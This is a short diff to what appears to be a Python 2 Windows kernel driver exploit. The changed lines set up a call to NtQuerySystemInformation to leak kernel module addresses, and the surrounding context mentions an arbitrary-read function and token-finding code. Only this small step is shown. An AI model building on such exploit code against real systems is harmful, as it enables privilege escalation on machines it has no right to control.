@@ -158,8 +158,8 @@ def readQWORD(driver_handle, what=None, where=None):
     # token finding code here
 
     print '[*] Calling NtQuerySystemInformation w/SystemModuleInformation'
-    sys_info = create_string_buffer()
-    sys_info_len = c_ulong()
+    sys_info = create_string_buffer(0)
+    sys_info_len = c_ulong(0)
 
     ntdll.NtQuerySystemInformation(0xb, sys_info, len(sys_info),
                                    addressof(sys_info_len))
